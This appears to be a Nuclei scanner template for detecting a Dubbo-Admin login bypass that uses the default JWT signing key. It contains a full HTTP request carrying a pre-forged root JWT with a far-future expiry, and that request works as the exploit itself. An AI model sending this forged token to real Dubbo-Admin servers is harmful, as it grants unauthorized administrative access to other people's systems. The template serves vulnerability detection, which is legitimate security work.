id: dubbo-admin-default-jwt
info:
  name: Dubbo-Admin Default JWT Key Login Bypass
  author: ProjectDiscoveryAI
  severity: high
  tags: auth-bypass
  reference:
    - https://fofa.info
http:
  - raw:
      - |
        GET /api/dev/applications HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        dsl:
          - status_code != 200
          - body == ""
  - raw:
      - |
        GET /api/dev/applications HTTP/1.1
        Host: {{Hostname}}
        Authorization: eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjk5OTk5OTk5OTksInN1YiI6InJvb3QiLCJpYXQiOjE2OTkwODM2Mzd9.wKRqJkWxr_nVDcVVF5rniqhnACtqaDnYUUu55g-atkIwRIt1A-SMpKqBN5zrGZl4kFVcrjzMvXsYqfqf0N9Gbg
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "dubbo-admin"
